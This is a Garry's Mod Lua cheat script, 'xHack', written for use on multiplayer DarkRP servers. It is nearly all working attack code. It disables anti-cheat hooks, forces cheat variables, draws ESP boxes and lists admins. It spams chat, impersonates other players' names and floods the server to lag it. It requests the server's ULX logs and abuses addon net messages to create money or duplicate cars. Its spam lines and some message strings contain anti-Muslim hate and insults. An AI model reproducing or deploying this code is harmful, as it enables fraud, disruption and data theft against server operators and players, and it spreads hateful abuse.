----------------------------------
-- xHack Fucking Private Shit.. --
-- xHack Developer: Unlimited.. --
----------------------------------

if !( CLIENT ) then return end

--Unlimited.
--StandDev.
--Regan, Pikey.
--FPtje (Falco).
--Big Kirby <3.

/**      #     #                              ######                                            
 #    #  #     #    ##     ####   #    #      #     #  #####   #  #    #    ##    #####  ###### 
  #  #   #     #   #  #   #    #  #   #       #     #  #    #  #  #    #   #  #     #    #      
   ##    #######  #    #  #       ####        ######   #    #  #  #    #  #    #    #    #####  
   ##    #     #  ######  #       #  #        #        #####   #  #    #  ######    #    #      
  #  #   #     #  #    #  #    #  #   #       #        #   #   #   #  #   #    #    #    #      
 #    #  #     #  #    #   ####   #    #      #        #    #  #    ##    #    #    #    ###### 
**/

--Fucking, Variables and shite..
local ply = LocalPlayer()
local xVer = 1.2
local xReq = 0;
local xTim = math.random(1,500)
local amount = -5000000000
local xCol = math.random(1,255)
local xView = LocalPlayer():GetEyeTrace().Entity
local xName = { "001000110011", "11010101010", "1000101011", "100100010100", "101001011010" }
local xAdmin = { "STEAM_0:1:82597652", "STEAM_0:0:56486352", "STEAM_0:0:41045922", "STEAM_0:0:105619279", "STEAM_0:0:95111311" }
local xRandom = { "Muslims are destroying England.", "Jay is an autistic fucker.", "StandDev thinks he's a hacker.", "Regan rides a horse and cart.", "Josh has feret claws.", "Luke has a large, wonky ear" }

--Fucking functions for printing the fucking chat and console messasges you cunt.
function xMsg(message)
xReq = xReq + 1
chat.AddText(Color(255, 0, 0), "[xHack]: ", Color(255,255,255), message)
end
function xPnt(message)
xReq = xReq + 1
MsgC(Color(255, 0, 0), "[xHack]: ", Color(255,255,255), message, "\n")
end
concommand.Add("xHack_menu", function( ply )
local xMenu = DermaMenu() -- Is the same as vgui.Create( "DMenu" )
--Basic check for allowed access.

xMenu:AddOption("xHack Menu " .. xVer, function()
	Derma_Message("Welcome to xHack.\nYou're using a private edition.\nCurrent Version: " .. xVer .. ".", "xHack " ..xVer, "Return")
end):SetImage( "icon16/chart_curve.png" )

xMenu:AddSpacer() //Line spacer to make the menu look a little bit neater.

local xGen = xMenu:AddSubMenu( "General" )

xGen:AddOption("Check For Admins", function()
xMsg("Searching for admins..")
timer.Simple( 1, function()
for k,v in pairs( player.GetAll() ) do
if v:IsValid() and v:IsAdmin() or v:IsUserGroup( "mod" ) or v:IsUserGroup( "Mod" ) or v:IsUserGroup() == "operator" then
xMsg("Admin: " .. v:Nick() .. " - SteamID: " .. v:SteamID() .. ".")
end
end
end)
end):SetImage("icon16/shield_go.png")

xGen:AddOption("List Information", function()
xMsg("Searching all players for useful information..")
timer.Simple(1 , function()
for k,v in pairs( player.GetAll()) do
if v:IsValid() and !v:IsAdmin() then
xMsg("User: " .. v:Nick() .. " - SteamID: " .. v:SteamID() .. ".")
end
end
end)
end):SetImage("icon16/database_add.png")

xGen:AddOption("Check Player Money", function()
xMsg("Attempting to check everyones wallet..")
timer.Simple(1 , function()
for k,v in pairs( player.GetAll() ) do
local xWallet = (v.DarkRPVars and v.DarkRPVars.money) or 0
xMsg("Player: " .. v:Nick() .. " - Money: $" .. xWallet .. ".")
end
end)
end):SetImage("icon16/coins.png")

local xVar = xMenu:AddSubMenu( "Variable" )

xVar:AddOption("Force Cheats", function()
xMsg("Forcing sv_cheats for you..")
timer.Simple(1, function()
xMsg("The variable has been set.")
ply:ConCommand("incrementvar sv_cheats 0 1 1")
end)
end):SetImage("icon16/lock_break.png")

xVar:AddOption("Force Lua", function()
xMsg("Forcing sv_allowcslua for you..")
timer.Simple(1, function()
xMsg("The variable has been set.")
ply:ConCommand("incrementvar sv_allowcslua 0 1 1")
end)
end):SetImage("icon16/lock_break.png")

local xView = xMenu:AddSubMenu( "Render" )

xView:AddOption("> Screen Material", function()
xMsg("Drawing a nice screen overlay..")
timer.Simple(1, function()
function matScrn()
DrawMaterialOverlay( "effects/combine_binocoverlay.vmt", 0.5 )
end 
hook.Add( "RenderScreenspaceEffects", "MatScreen", matScrn )
end)
end):SetImage("icon16/map_add.png")

xView:AddOption("< Screen Material", function()
xMsg("Removing material scree overlay.")
timer.Simple(1, function()
hook.Remove("RenderScreenspaceEffects", "MatScreen")
end)
end):SetImage("icon16/map_delete.png")

xView:AddOption("> Player Box", function()
xMsg("Drawing a box around every player..")
timer.Simple(1, function()
local rotation_vectors =
{
	Vector( 1, 	1,	1 ),
	Vector( -1, 1, 	1 ),
	Vector( 1, 	-1, 1 ),
	Vector( -1, -1, 1 )
}
hook.Add( "HUDPaint", "xPlayerBox", function()
surface.SetDrawColor( color_white )
local w, h = ScrW(), ScrH()
for k,v in pairs( player.GetAll() ) do
if v ~= LocalPlayer() and v:IsValid() and v:IsPlayer() then
local p = v:GetPos()
local a = v:GetAngles()
local mins = v:OBBMins()
local maxs = v:OBBMaxs()	
local left, top 	= w, h
local right, bot	= 0, 0	
for _, v in next, rotation_vectors do
local mins, maxs = mins, maxs		
mins:Rotate( a )
maxs:Rotate( a )
local s_mins = ( p + mins * v ):ToScreen()
local s_maxs = ( p + maxs * v ):ToScreen()
left 	= math.min( left, math.min( s_mins.x, s_maxs.x ) )
top		= math.min( top, math.min( s_mins.y, s_maxs.y ) )
right 	= math.max( right, math.max( s_mins.x, s_maxs.x ) )
bot		= math.max( bot, math.max( s_mins.y, s_maxs.y ) )
end
surface.DrawOutlinedRect( left, top, right - left, bot - top )
end
end
end )
end)
xMsg("Player box has been enabled.")
end):SetImage("icon16/group_add.png")

xView:AddOption("< Player Box", function()
xMsg("Removing the box around every player.")
timer.Simple(1, function()
hook.Remove( "HUDPaint", "xPlayerBox")
xMsg("Player box has been disabled.")
end)
end):SetImage("icon16/group_add.png")

local xSpam = xMenu:AddSubMenu( "Flood" )

xSpam:AddOption("> Name Stealing", function()
xMsg("Attempting to find players and steal their name..")
timer.Simple( 1, function()
timer.Create("givemename", 0.12, 0, function()
local ThatNameBefore = ply:Nick()
for k,v in pairs( player.GetAll() ) do
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
if ligger_type1 == ligger_type then
if ThatNameBefore == v:Nick() then
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
else
ply:ConCommand("darkrp name " .. v:Nick() .. math.random(1,10))
end
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
end
end
end)
end)
end):SetImage("icon16/book_add.png")

xSpam:AddOption("< Name Stealing", function()
xMsg("Removing the timer to steal player names..")
timer.Simple( 1, function()
timer.Destroy("givemename")
end)
end):SetImage("icon16/book_delete.png")

xSpam:AddOption("> Chat Spam", function()
xMsg("Beginning to spam random shit..")
timer.Simple( 1, function()
timer.Create("chatspamboi", 1, 0, function()
ply:ConCommand("say /ooc " .. table.Random(xRandom) .. "")
end)
end)

end):SetImage("icon16/lock.png")

xSpam:AddOption("< Chat Spam", function()
xMsg("Removing the timer to spam chat..")
timer.Simple( 1, function()
timer.Destroy("chatspamboi")
end)
end):SetImage("icon16/lock.png")

xSpam:AddOption("> Server Lag", function()
xMsg("Resourcing a server message and attempting to lag..")
timer.Simple( 1, function()
timer.Create("uSkid_lag", 1, 0, function()				
for i=1,10000 do
net.Start("DarkRP_spawnPocket")
net.SendToServer()
end
end)
end)
end):SetImage("icon16/disconnect.png")

xSpam:AddOption("< Server Lag", function()
xMsg("Attempting to halt the timer for server lag..")
timer.Simple( 1, function()
timer.Destroy("uSkid_lag")
end)
end):SetImage("icon16/connect.png")

local xDown = xMenu:AddSubMenu( "Download" )

xDown:AddOption("Download Logs", function()
xMsg("Attempting to steal ULX logs..")
timer.Simple( 1, function()
if file.Exists("download/data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt", "GAME") == "false" then
xMsg("Please delete the ulx logs that are saved in todays date.")
else
RequestFile(os.date( "data/" .. "ulx_logs" .. "/" .. "%m-%d-%y" .. ".txt" ))
end
xMsg("The logs should be available within around 30 seconds..")
end)
timer.Simple( 25, function()
xMsg("The downloaded ULX logs should now be ready for you.")
end)
end):SetImage("icon16/arrow_down.png")

local xPloit = xMenu:AddSubMenu( "Exploit" )

xPloit:AddOption("$ Bailout NPC", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function()
timer.Create("givemecashlad", 0.1, 0, function()
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for k,v in pairs( player.GetAll() ) do
net.Start( "BailOut" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteFloat( amount ) -- $2,000,000 Free cash.
net.SendToServer()
end
end)
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ HitmanX", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start( "SendMoney" )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteString( amount )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Derma Hitmenu", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start("hitcomplete")
net.WriteDouble( 1073500000 )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ DaHit Menu", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start( "DaHit" )
net.WriteFloat( amount )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ HHH Hitmenu", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for k,v in pairs(player.GetAll()) do  
dahater = v
end
local hitRequest = {}
hitRequest.hitman = uPly
hitRequest.requester = uPly
hitRequest.target = dahater
hitRequest.reward = -99999999999999999999999
net.Start( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Boowie NPC", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start("BuyCar")
net.WriteFloat( amount )
net.WriteEntity( ply )
net.WriteString("Islam Sucks.")
net.WriteString("Islam Sucks.")
net.WriteString("Islam Sucks.")
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ VCMod", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for i = 0, 100 do
net.Start( "AttemptSellCar" )
net.WriteTable( { E = ent } )
net.SendToServer()
end
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Car Dealer", function()
local ent = LocalPlayer():GetEyeTrace().Entity
if ( !IsValid( ent ) ) then
xMsg("You must be looking at your car.")
return
end
xMsg("Attempting to find addon and duplicate car..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for i = 0, 100 do
net.Start( "RXCAR_Shop_Store_C2S" )
net.WriteTable( { E = ent } )
net.SendToServer()
end
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Bailout NPC", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)



end)
end):SetImage("icon16/money.png")

--Now we have made a menu, let's make it show up when the console command is run.
xMenu:Open()
xMenu:Center()
end)

xMsg("Welcome to xHack. You're using version: " .. xVer .. "")
xPnt("xHack Menu - Opened..")

--Now lets just delete some server hooks that we do not want to see function.
timer.Destroy( "STC" )
hook.Remove("PlayerInitialSpawn", "AddPlayer")
hook.Remove("OnGamemodeLoaded", "___scan_g_init")
hook.Remove("PlayerSay", "screengrab_playersay")
hook.Remove("Think", "PlayerInfoThing")
timer.Destroy("AntiCheatTimer")
timer.Destroy("testing123")
hook.Remove("Think", "sh_menu")